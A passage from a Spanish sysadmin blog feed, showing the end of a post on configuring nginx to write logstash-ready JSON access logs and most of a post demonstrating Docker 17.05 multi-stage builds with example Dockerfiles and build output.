&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/Mar/2017:10:26:59 +0000&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="m"&gt;1966&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1 - - &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/Mar/2017:10:26:59 +0000&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET /favicon.ico HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;404&lt;/span&gt; &lt;span class="m"&gt;571&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://172.17.0.2/&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo por echar un vistazo en internet, vemos que hay varias opciones, siendo la que más me gusta &lt;a href="https://github.com/jiaz/nginx-http-json-log"&gt;esta opción&lt;/a&gt;. Sin embargo es un módulo de terceros y no suele venir compilado en ninguna distribución conocida.&lt;/p&gt;
&lt;p&gt;Como no es plan ponerse a compilar, podemos encontrar una solución más fácil en &lt;a href="http://nginx.org/en/docs/http/ngx_http_log_module.html"&gt;la documentación de nginx&lt;/a&gt;, que aunque no es la más correcta, nos sirve para salir del paso.&lt;/p&gt;
&lt;p&gt;Se trata de crear un formato de &lt;em&gt;log&lt;/em&gt; personalizado, que podemos utilizar en todos nuestros sitios, y que &lt;strong&gt;logstash&lt;/strong&gt; sabe &lt;em&gt;parsear&lt;/em&gt; de serie.&lt;/p&gt;
&lt;p&gt;Para ello vamos a modificar nuestra configuración para crear un nuevo formato de &lt;em&gt;log&lt;/em&gt; llamado &lt;em&gt;logstash_json&lt;/em&gt;, que debe ir obligatoriamente dentro del bloque &lt;em&gt;http&lt;/em&gt; (directiva &lt;em&gt;log_format&lt;/em&gt;). Luego podemos utilizar ese formato en cualquier bloque &lt;em&gt;http&lt;/em&gt;, &lt;em&gt;server&lt;/em&gt; o &lt;em&gt;location&lt;/em&gt; que nos convenga (directiva &lt;em&gt;access_log&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;A nivel de ejemplo, os pongo a continuación una configuración muy simple, con ambas directivas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~/docker/nginx$ cat nginx.conf 
worker_processes &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    log_format logstash_json &lt;span class="s1"&gt;&amp;#39;{ &amp;quot;@timestamp&amp;quot;: &amp;quot;$time_iso8601&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;@fields&amp;quot;: { &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;remote_addr&amp;quot;: &amp;quot;$remote_addr&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;remote_user&amp;quot;: &amp;quot;$remote_user&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;body_bytes_sent&amp;quot;: &amp;quot;$body_bytes_sent&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;request_time&amp;quot;: &amp;quot;$request_time&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;status&amp;quot;: &amp;quot;$status&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;request&amp;quot;: &amp;quot;$request&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;request_method&amp;quot;: &amp;quot;$request_method&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;http_referrer&amp;quot;: &amp;quot;$http_referer&amp;quot;, &amp;#39;&lt;/span&gt;
                             &lt;span class="s1"&gt;&amp;#39;&amp;quot;http_user_agent&amp;quot;: &amp;quot;$http_user_agent&amp;quot; } }&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    access_log /var/log/nginx/access.log logstash_json&lt;span class="p"&gt;;&lt;/span&gt;

    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@server:~/docker/nginx$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras consultar los &lt;em&gt;logs&lt;/em&gt; tras algunas consultas, vemos que sale un formato correctamente formado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;@timestamp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2017-03-10T10:38:37+00:00&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;@fields&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;remote_addr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;remote_user&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;body_bytes_sent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_time&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.000&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;304&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_method&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_referrer&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_user_agent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;@timestamp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2017-03-10T10:38:56+00:00&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;@fields&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;remote_addr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;remote_user&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;body_bytes_sent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;571&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_time&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.000&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;404&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET /nonexistent HTTP/1.1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;request_method&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_referrer&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http_user_agent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para comprobar que el formato es correcto, y ya de paso verlo más bonito, podemos utilizar cualquier herramienta para validar formato JSON. Como ya sabéis que yo soy un fan del terminal, voy a hacerlo en &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~/docker/nginx$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{ &amp;quot;@timestamp&amp;quot;: &amp;quot;2017-03-10T10:38:37+00:00&amp;quot;, &amp;quot;@fields&amp;quot;: { &amp;quot;remote_addr&amp;quot;: &amp;quot;172.17.0.1&amp;quot;, &amp;quot;remote_user&amp;quot;: &amp;quot;-&amp;quot;, &amp;quot;body_bytes_sent&amp;quot;: &amp;quot;0&amp;quot;, &amp;quot;request_time&amp;quot;: &amp;quot;0.000&amp;quot;, &amp;quot;status&amp;quot;: &amp;quot;304&amp;quot;, &amp;quot;request&amp;quot;: &amp;quot;GET / HTTP/1.1&amp;quot;, &amp;quot;request_method&amp;quot;: &amp;quot;GET&amp;quot;, &amp;quot;http_referrer&amp;quot;: &amp;quot;-&amp;quot;, &amp;quot;http_user_agent&amp;quot;: &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot; } }&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; python -m json.tool
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;@fields&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;body_bytes_sent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;http_referrer&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;http_user_agent&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;remote_addr&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;172.17.0.1&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;remote_user&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;request&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET / HTTP/1.1&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;request_method&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;request_time&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;0.000&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;304&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;@timestamp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;2017-03-10T10:38:37+00:00&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@server:~/docker/nginx$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya podemos configurar nuestro &lt;strong&gt;logstash&lt;/strong&gt;.&lt;/p&gt;</content><category term="logs"></category><category term="nginx"></category><category term="logstash"></category></entry><entry><title>Docker 17.05 con multi-stage build</title><link href="https://www.linuxsysadmin.ml/2017/05/docker-1705-con-multi-stage-build.html" rel="alternate"></link><published>2017-05-22T10:00:00+02:00</published><updated>2017-05-22T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-22:/2017/05/docker-1705-con-multi-stage-build.html</id><summary type="html">&lt;p&gt;Hacía tiempo que esperaba ansiosamente la nueva versión de &lt;strong&gt;docker&lt;/strong&gt;. La raíz de tanta expectación son las mejoras que la versión candidata anunciaba, especialmente el nuevo modelo de &lt;em&gt;build&lt;/em&gt;. Se ha modificado los &lt;em&gt;Dockerfile&lt;/em&gt; para que puedan generar varias imágenes en un solo fichero, algunas de ellas partiendo de otras …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hacía tiempo que esperaba ansiosamente la nueva versión de &lt;strong&gt;docker&lt;/strong&gt;. La raíz de tanta expectación son las mejoras que la versión candidata anunciaba, especialmente el nuevo modelo de &lt;em&gt;build&lt;/em&gt;. Se ha modificado los &lt;em&gt;Dockerfile&lt;/em&gt; para que puedan generar varias imágenes en un solo fichero, algunas de ellas partiendo de otras.&lt;/p&gt;
&lt;p&gt;La gran mejora de la versión consiste en poder especificar varias veces el &lt;em&gt;keyword&lt;/em&gt; &lt;strong&gt;FROM&lt;/strong&gt;, para poder crear imágenes varias en el mismo fichero. Para ello, hay dos mejoras sustanciales en la sintaxis de los &lt;em&gt;keywords&lt;/em&gt; &lt;strong&gt;FROM&lt;/strong&gt; y &lt;strong&gt;COPY&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que puedes crear imágenes intermedias, para que luego algunas otras hereden de ella e incluso se puedan pasar ficheros entre sí. Eso se consigue con dos cambios nuevos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El &lt;em&gt;keyword&lt;/em&gt; &lt;strong&gt;FROM&lt;/strong&gt; puede incluir un &lt;em&gt;keywork&lt;/em&gt; &lt;strong&gt;AS&lt;/strong&gt;, que va a permitir heredar a las demás imágenes a partir de este &lt;em&gt;keyword&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;keyword&lt;/em&gt; &lt;strong&gt;COPY&lt;/strong&gt; puede llevar un &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;--from&lt;/strong&gt; que permite copiar ficheros entre las imágenes creadas por el mismo &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Un ejemplo rápido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/ejemplo$ cat Dockerfile 
FROM alpine:3.5 AS base
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cat&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/greeting&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;

FROM base AS victim
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; gold &amp;gt; /stealme
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; hello &amp;gt; /greeting

FROM base
COPY --from&lt;span class="o"&gt;=&lt;/span&gt;victim /stealme /
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; bye &amp;gt; /greeting
gerard@aldebaran:~/docker/ejemplo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen como de costumbre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/ejemplo$ docker build -t ejemplo .
Sending build context to Docker daemon  &lt;span class="m"&gt;2&lt;/span&gt;.048kB
Step &lt;span class="m"&gt;1&lt;/span&gt;/8 : FROM alpine:3.5 AS base
 ---&amp;gt; 4a415e366388
Step &lt;span class="m"&gt;2&lt;/span&gt;/8 : CMD cat /greeting
 ---&amp;gt; Running in c27e95810829
 ---&amp;gt; 36e7f6d769bd
Removing intermediate container c27e95810829
Step &lt;span class="m"&gt;3&lt;/span&gt;/8 : FROM base AS victim
 ---&amp;gt; 36e7f6d769bd
Step &lt;span class="m"&gt;4&lt;/span&gt;/8 : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; gold &amp;gt; /stealme
 ---&amp;gt; Running in 1ea9e0668bb7
 ---&amp;gt; e0dc8c579221
Removing intermediate container 1ea9e0668bb7
Step &lt;span class="m"&gt;5&lt;/span&gt;/8 : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; hello &amp;gt; /greeting
 ---&amp;gt; Running in e0da2940311e
 ---&amp;gt; b2f3845ad8ff
Removing intermediate container e0da2940311e
Step &lt;span class="m"&gt;6&lt;/span&gt;/8 : FROM base
 ---&amp;gt; 36e7f6d769bd
Step &lt;span class="m"&gt;7&lt;/span&gt;/8 : COPY --from&lt;span class="o"&gt;=&lt;/span&gt;victim /stealme /
 ---&amp;gt; 918c21e97a6b
Removing intermediate container 4846e3cc50a7
Step &lt;span class="m"&gt;8&lt;/span&gt;/8 : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; bye &amp;gt; /greeting
 ---&amp;gt; Running in e3ad8598d14d
 ---&amp;gt; e451f40afe17
Removing intermediate container e3ad8598d14d
Successfully built e451f40afe17
Successfully tagged ejemplo:latest
gerard@aldebaran:~/docker/ejemplo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que los pasos 3 y 6 parten ambos de la imagen &lt;em&gt;base&lt;/em&gt;, mientras que la imagen final, copia un fichero de la imagen &lt;em&gt;victim&lt;/em&gt;, de la que no hereda siquiera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/ejemplo$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE
ejemplo             latest              e451f40afe17        About a minute ago   &lt;span class="m"&gt;3&lt;/span&gt;.99MB
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              b2f3845ad8ff        About a minute ago   &lt;span class="m"&gt;3&lt;/span&gt;.99MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.5                 4a415e366388        &lt;span class="m"&gt;2&lt;/span&gt; months ago         &lt;span class="m"&gt;3&lt;/span&gt;.99MB
gerard@aldebaran:~/docker/ejemplo$ docker run --rm b2f3845ad8ff
hello
gerard@aldebaran:~/docker/ejemplo$ docker run --rm ejemplo
bye
gerard@aldebaran:~/docker/ejemplo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otro detalle curioso es que el &lt;em&gt;tag&lt;/em&gt; solo se puede dar a la imagen del último &lt;strong&gt;FROM&lt;/strong&gt; del &lt;em&gt;Dockerfile&lt;/em&gt;. Hay que tener en cuenta que si una imagen falla al construir, no se sigue con las demás.&lt;/p&gt;
&lt;h2&gt;Posibles usos&lt;/h2&gt;
&lt;h3&gt;Pipelines de test&lt;/h3&gt;
&lt;p&gt;Cuando una imagen falla, el resto de imágenes no se construyen. Podemos aprovechar este punto para crear la imagen de test, ejecutando los tests necesarios. De esta forma, si los tests fallan, el &lt;em&gt;build&lt;/em&gt; falla y no se genera la imagen posterior de &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Supongamos este &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/pipeline$ cat Dockerfile 
FROM alpine:3.5 AS base
RUN apk add --no-cache python2
COPY script.py /

FROM base
COPY tests.py /
RUN python tests.py

FROM base
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;script.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/pipeline$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Supongamos el el &lt;em&gt;script&lt;/em&gt; de test falla; para ello he puesto un &lt;em&gt;script&lt;/em&gt; que devuelve siempre un código de retorno "1".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/pipeline$ docker build -t release .
Sending build context to Docker daemon  &lt;span class="m"&gt;4&lt;/span&gt;.096kB
...  
Step &lt;span class="m"&gt;6&lt;/span&gt;/8 : RUN python tests.py
 ---&amp;gt; Running in 4572bed9ffb5
Tests FAILED
The &lt;span class="nb"&gt;command&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/bin/sh -c python tests.py&amp;#39;&lt;/span&gt; returned a non-zero code: &lt;span class="m"&gt;1&lt;/span&gt;
gerard@aldebaran:~/docker/pipeline$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No se genera ningún &lt;em&gt;tag&lt;/em&gt;, porque uno de los pasos ha fallado. De esta forma, no tenemos &lt;em&gt;release&lt;/em&gt; porque tenerla no sirve de nada: está rota.&lt;/p&gt;
&lt;p&gt;Veamos ahora lo que pasa si el test tiene éxito:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/pipeline$ docker build -t release .
Sending build context to Docker daemon  &lt;span class="m"&gt;4&lt;/span&gt;.096kB
...  
Step &lt;span class="m"&gt;6&lt;/span&gt;/8 : RUN python tests.py
 ---&amp;gt; Running in 5a8908410927
Tests OK
 ---&amp;gt; 2cd640cc2122
Removing intermediate container 5a8908410927
Step &lt;span class="m"&gt;7&lt;/span&gt;/8 : FROM base
 ---&amp;gt; 9a6cafb2fd49
Step &lt;span class="m"&gt;8&lt;/span&gt;/8 : CMD python script.py
 ---&amp;gt; Running in bad18c8f4f27
 ---&amp;gt; 6221630d5ac3
Removing intermediate container bad18c8f4f27
Successfully built 6221630d5ac3
Successfully tagged release:latest
gerard@aldebaran:~/docker/pipeline$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y en este caso tenemos una release, con una imagen de &lt;em&gt;runtime&lt;/em&gt;, sin los tests, y con la directiva &lt;strong&gt;CMD&lt;/strong&gt; lista para ser usada.&lt;/p&gt;
&lt;h3&gt;Reducción de capas&lt;/h3&gt;
&lt;p&gt;A todos nos ha pasado que copiamos unos ficheros en nuestras imágenes, y tras aplicarles modificaciones de permisos y de usuarios, esos ficheros ocupan el doble o más. Es inevitable. La idea es poder utilizar una imagen grande para adecuar nuestros fichero y luego copiarlos a una imagen en su forma final.&lt;/p&gt;
&lt;p&gt;Supongamos el siguiente ejemplo, donde &lt;em&gt;bigfile&lt;/em&gt; es un fichero de 100mb con permisos 644 y que pertenece a mi usuario:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/bigfiles$ cat Dockerfile 
FROM busybox AS builder
COPY bigfile /
RUN chmod &lt;span class="m"&gt;777&lt;/span&gt; /bigfile &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    chown nobody:nogroup /bigfile

FROM busybox
COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /bigfile /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-lh&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/bigfiles$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/bigfiles$ docker build -t final .
Sending build context to Docker daemon  &lt;span class="m"&gt;104&lt;/span&gt;.9MB
Step &lt;span class="m"&gt;1&lt;/span&gt;/6 : FROM busybox AS builder
latest: Pulling from library/busybox
7520415ce762: Pull &lt;span class="nb"&gt;complete&lt;/span&gt; 
Digest: sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f
Status: Downloaded newer image &lt;span class="k"&gt;for&lt;/span&gt; busybox:latest
 ---&amp;gt; 00f017a8c2a6
Step &lt;span class="m"&gt;2&lt;/span&gt;/6 : COPY bigfile /
 ---&amp;gt; 0a27ff02824b
Removing intermediate container 56007f1c8e9d
Step &lt;span class="m"&gt;3&lt;/span&gt;/6 : RUN chmod &lt;span class="m"&gt;777&lt;/span&gt; /bigfile &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     chown nobody:nogroup /bigfile
 ---&amp;gt; Running in b8ff92d84014
 ---&amp;gt; bf3600cb8967
Removing intermediate container b8ff92d84014
Step &lt;span class="m"&gt;4&lt;/span&gt;/6 : FROM busybox
 ---&amp;gt; 00f017a8c2a6
Step &lt;span class="m"&gt;5&lt;/span&gt;/6 : COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /bigfile /
 ---&amp;gt; 57b8aa7c2aeb
Removing intermediate container e2ec30bfd912
Step &lt;span class="m"&gt;6&lt;/span&gt;/6 : CMD ls -lh /
 ---&amp;gt; Running in a212d95bb65f
 ---&amp;gt; c672e1ad3fcb
Removing intermediate container a212d95bb65f
Successfully built c672e1ad3fcb
Successfully tagged final:latest
gerard@aldebaran:~/docker/bigfiles$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado es sorprendente: Nos ahorramos el duplicado del fichero &lt;em&gt;bigfile&lt;/em&gt;, y este conserva los permisos que le habíamos indicado, pero &lt;strong&gt;el usuario sigue siendo root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/bigfiles$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
final               latest              c672e1ad3fcb        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       106MB
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              bf3600cb8967        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       211MB
busybox             latest              00f017a8c2a6        &lt;span class="m"&gt;2&lt;/span&gt; months ago        &lt;span class="m"&gt;1&lt;/span&gt;.11MB
gerard@aldebaran:~/docker/bigfiles$ docker &lt;span class="nb"&gt;history&lt;/span&gt; bf3600cb8967
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
bf3600cb8967        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; /bin/sh -c chmod &lt;span class="m"&gt;777&lt;/span&gt; /bigfile &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ch...   105MB               
0a27ff02824b        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:777847f3f03c68...   105MB               &lt;/span&gt;
